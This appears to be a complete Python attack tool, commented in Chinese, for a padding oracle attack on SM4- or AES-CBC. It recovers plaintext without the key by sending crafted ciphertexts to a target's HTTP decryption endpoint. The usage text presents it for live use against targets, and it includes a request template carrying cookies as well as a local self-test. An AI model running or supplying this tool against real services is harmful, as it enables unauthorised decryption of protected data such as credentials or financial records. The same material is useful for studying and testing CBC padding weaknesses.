#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SM4-CBC Padding Oracle 攻击 —— 无需密钥解密任意密文 (零依赖)
=============================================================
原理: CBC 模式下, 服务端解密后若 PKCS7 填充错误会返回不同响应 (400/500/特定文案),
      通过翻转前一密文块逐字节探测, 还原中间值 I = D(C), 从而得到明文 P = I ^ Cprev。
      攻击只在密文块间进行, 不需要密钥。

前提:
    1. 目标使用 SM4/AES-CBC + PKCS7 填充
    2. 存在可区分的 padding oracle 信号 (状态码/响应文案/耗时差异)

用法:
    # 自检 (本地 SM4 模拟 oracle, 验证攻击逻辑)
    python sm4_padding_oracle.py --selftest

    # 实战: HTTP JSON oracle (POST {param: b64(密文)}, 200=填充有效)
    python sm4_padding_oracle.py --b64 <密文> --iv <hex> \
        --url http://target/api/decrypt --param data \
        [--valid-marker ok] [--invalid-marker error]

    # 密文从文件读
    python sm4_padding_oracle.py --hex -i cipher.hex --iv <hex> \
        --url ... --param data

    # oracle 与目标格式不符时: 编辑下方 oracle() 函数或 --oracle-file 提供
    python sm4_padding_oracle.py --hex -i cipher.hex --iv <hex> --oracle-file my_oracle.py
"""
import argparse
import base64
import re
import sys

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
if hasattr(sys.stderr, 'reconfigure'):
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')

BS = 16  # SM4/AES 块大小


class OracleError(Exception):
    pass


# ================================================================
# 核心攻击
# ================================================================
def decrypt_block(ct_block: bytes, prev_block: bytes, oracle, bs: int = BS) -> bytes:
    """
    解密单个密文块。oracle(伪造密文) -> 填充是否有效 (True/False)。
    返回该块的明文 (含 PKCS7 填充字节)。
    """
    inter = bytearray(bs)          # 此处实际累积的是明文 P (非中间值 I), 见下
    for pad in range(1, bs + 1):   # 目标填充值
        pos = bs - pad             # 当前探测字节位置
        cands = []
        for g in range(256):       # 爆破候选
            crafted = bytearray(prev_block)
            for j in range(pos + 1, bs):        # 已解出的低位固定为 pad
                crafted[j] = prev_block[j] ^ inter[j] ^ pad
            crafted[pos] = prev_block[pos] ^ g
            if oracle(bytes(crafted) + ct_block):
                cands.append(g)
        if not cands:
            raise OracleError(f"[!] 第 {pad} 字节无有效候选 — oracle 判定可能不可靠")

        # 多候选消歧: 扰动 pos 上一字节 (更高位), 真候选不受影响,
        # 巧合产生的更长填充会因高位被改而失效。用多个扰动值交叉验证。
        while len(cands) > 1 and pos > 0:
            keep = []
            for g in cands:
                ok = True
                for pb in (0x00, 0xFF, 0x5A):
                    crafted = bytearray(prev_block)
                    for j in range(pos + 1, bs):
                        crafted[j] = prev_block[j] ^ inter[j] ^ pad
                    crafted[pos] = prev_block[pos] ^ g
                    crafted[pos - 1] = prev_block[pos - 1] ^ pb
                    if not oracle(bytes(crafted) + ct_block):
                        ok = False
                        break
                if ok:
                    keep.append(g)
            cands = keep or cands   # 全失败则退回原候选 (极小概率)

        # crafted[pos]=prev[pos]^g → P[pos]=g^pad; inter[pos] 即明文字节
        inter[pos] = cands[0] ^ pad

    return bytes(inter)


def decrypt_cbc(ct: bytes, iv: bytes, oracle, bs: int = BS) -> bytes:
    """CBC 全块解密, 返回明文 (含最后一个块的 PKCS7 填充)。"""
    if not ct or len(ct) % bs != 0:
        raise OracleError("[!] 密文长度须为块大小的正整数倍")
    blocks = [ct[i:i + bs] for i in range(0, len(ct), bs)]
    plain = b''
    prev = iv
    for i, blk in enumerate(blocks):
        pt = decrypt_block(blk, prev, oracle, bs)
        print(f"    [块 {i}] 明文: {pt!r}")
        plain += pt
        prev = blk
    return plain


# ================================================================
# oracle 定义 (二选一: 用 HTTP 参数 或 自定义文件)
# ================================================================
def make_http_oracle(url, param, valid_marker='', invalid_marker='',
                     status=200, timeout=8):
    """通用 HTTP oracle: POST JSON {param: b64(ciphertext)}, 判定填充有效性。"""
    import requests

    def oracle(ct):
        try:
            r = requests.post(url, json={param: base64.b64encode(ct).decode()},
                              timeout=timeout)
            body = r.text
            if invalid_marker and invalid_marker in body:
                return False
            if valid_marker:
                return bool(re.search(valid_marker, body))
            return r.status_code == status
        except requests.RequestException:
            return False
    return oracle


def oracle_stub(ct):
    """自定义 oracle 模板 —— 改成你的目标判定逻辑后即可实战。
    例如 (从抓包改写):
        r = requests.post('https://target/decrypt',
                          data={'data': base64.b64encode(ct).decode()},
                          cookies=COOKIES, timeout=8)
        return '解密失败' not in r.text and r.status_code == 200
    """
    raise NotImplementedError(
        "[!] 需要定义 oracle() 函数。\n"
        "    简单场景用: --url <endpoint> --param <字段名> [--valid-marker / --invalid-marker]\n"
        "    复杂场景: 编辑本函数, 或 --oracle-file <my_oracle.py> 定义 oracle(ct)->bool")


def load_oracle_file(path):
    """从外部文件加载 oracle(ct)->bool。"""
    ns = {}
    src = open(path, encoding='utf-8').read()
    exec(compile(src, path, 'exec'), ns)  # noqa: S102 用户自供代码
    if 'oracle' not in ns:
        raise SystemExit(f"[!] {path} 中未定义 oracle(ct)->bool 函数")
    return ns['oracle']


# ================================================================
# 自检: 本地 SM4 模拟 oracle 验证攻击逻辑
# ================================================================
def selftest():
    import random
    from sm4 import sm4_cbc, pkcs7_pad

    key = bytes(range(16))
    iv = bytes(range(16, 32))

    def make_oracle():
        def oracle(ciphertext):
            try:
                sm4_cbc(ciphertext, key, iv, True, 'pkcs7')
                return True
            except ValueError:
                return False
        return oracle

    random.seed(2026)
    tests = [
        b'hello',
        b'\x01' * 16,                 # 整块全是填充值
        b'A' * 40,                    # 3 块
        bytes(random.randrange(256) for _ in range(31)),
        '银行转账 100 元 到 6222020200012345678 测试'.encode(),  # 中文多块
    ]
    oracle = make_oracle()
    ok_all = True
    for pt in tests:
        ct = sm4_cbc(pt, key, iv, False)              # 加密 (PKCS7)
        rec = decrypt_cbc(ct, iv, oracle)             # 攻击解密
        expect = pkcs7_pad(pt)                        # 含填充的明文
        status = 'OK' if rec == expect else 'FAIL'
        if rec != expect:
            ok_all = False
        print(f"  [{status}] len={len(pt):>2} 恢复={rec!r}")

    # 额外: 无填充模式 (CBC + 无 padding 目标, 解密结果含 PKCS7 由攻击自然带出)
    print(f"\n[{'全部通过' if ok_all else '存在失败'}] padding oracle 攻击逻辑自检")
    sys.exit(0 if ok_all else 1)


def main():
    ap = argparse.ArgumentParser(description='SM4-CBC Padding Oracle 解密')
    ap.add_argument('--selftest', action='store_true', help='本地模拟 oracle 自检')
    ap.add_argument('data', nargs='?', help='密文 (hex/base64)')
    ap.add_argument('--hex', action='store_true', help='输入为 hex')
    ap.add_argument('--b64', action='store_true', help='输入为 base64')
    ap.add_argument('-i', '--in', dest='infile', help='从文件读密文')
    ap.add_argument('--iv', required=False, help='IV (hex 32 或 base64)')
    ap.add_argument('--iv-b64', action='store_true', help='IV 为 base64')
    ap.add_argument('--url', help='oracle 端点 (POST JSON)')
    ap.add_argument('--param', default='data', help='POST 中承载密文的字段名')
    ap.add_argument('--valid-marker', default='', help='填充有效时响应含的文本')
    ap.add_argument('--invalid-marker', default='', help='填充无效时响应含的文本')
    ap.add_argument('--status', type=int, default=200, help='填充有效的状态码')
    ap.add_argument('--oracle-file', help='外部 oracle(ct)->bool 文件')
    ap.add_argument('--unpad', action='store_true', help='去除末尾 PKCS7 填充')
    args = ap.parse_args()

    if args.selftest:
        selftest()
        return

    if not args.iv:
        sys.exit("[-] 需要 --iv (hex 32 字符, 通常是登录响应/密钥交换时下发)")
    iv = base64.b64decode(args.iv) if args.iv_b64 else bytes.fromhex(args.iv)
    if len(iv) != BS:
        sys.exit(f"[-] IV 须为 {BS} 字节")

    # 读密文
    if args.infile:
        raw = open(args.infile).read().strip()
    elif args.data:
        raw = args.data
    else:
        sys.exit("[-] 需要密文 (位置参数) 或 -i 文件")
    ct = base64.b64decode(raw) if args.b64 else bytes.fromhex(raw)

    # oracle
    if args.oracle_file:
        oracle = load_oracle_file(args.oracle_file)
    elif args.url:
        oracle = make_http_oracle(args.url, args.param,
                                  args.valid_marker, args.invalid_marker, args.status)
    else:
        oracle = oracle_stub

    print(f"[*] 密文 {len(ct)} 字节 / {len(ct)//BS} 块, 开始攻击...")
    plain = decrypt_cbc(ct, iv, oracle)
    if args.unpad:
        n = plain[-1]
        if 1 <= n <= BS and plain[-n:] == bytes([n]) * n:
            plain = plain[:-n]
    try:
        print(f"\n[+] 明文: {plain.decode('utf-8')}")
    except UnicodeDecodeError:
        print(f"\n[+] 明文 (hex): {plain.hex()}")


if __name__ == '__main__':
    main()
